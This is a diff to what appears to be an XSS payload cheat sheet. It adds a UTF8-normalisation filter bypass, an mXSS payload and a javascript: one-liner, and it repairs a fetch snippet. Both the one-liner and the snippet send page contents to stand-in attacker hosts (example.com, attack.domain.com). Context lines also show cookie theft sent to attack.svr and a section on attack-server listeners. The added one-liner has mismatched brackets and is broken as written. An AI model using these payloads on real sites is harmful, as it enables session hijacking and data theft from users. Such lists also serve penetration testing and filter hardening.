@@ -112,6 +112,14 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
 ```
 
+#### UTF8 Normalisation
+
++ If the target attempts UTF8 normalisation it may be possible to circumvent a filter by replacing parts of a typical payload, like `<>` with UTF8 equivalents. When they are normalized they will become regular `<>` characters exposing the potential for XSS. 
+
+```js
+＜/p＞＜img src="x" onⅇrror="console.log(1)"/＞
+```
+
 
 ### DOM Event Based Payloads
 
@@ -245,6 +253,12 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 `GIF89a/*<svg/onload=alert(1)>*/=alert(1)//;`
 
 
+### mXSS
+
+```javascript
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+```
+
 ## Exploit Payloads
 
 JS code for embedding in exploit payloads.
@@ -301,13 +315,17 @@ document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 ```javascript
 fetch('/protected_page')
 	.then(page => page.text())
-	.then(text => 
+	.then(text => {
 		fetch('attack.domain.com', {
 			method: 'POST',
 			headers: { 'Content-Type': 'application/json' },
 			body: JSON.stringify({page:text})
 		})
-	)
+	})
+```
+
+```javascript
+javascript:fetch("https://victim.com/page").then(a => {a.text().then(b)=>fetch("http://example.com/?data="+btoa(b))})})
 ```
 
 ### Grab Specific Page Data
@@ -526,7 +544,7 @@ This section aims to document several approaches to setting up an attack server 
 + Start listener
 + Point payloads to instances public IP
 
-### Listners
+### Listeners
 
 #### NC
 
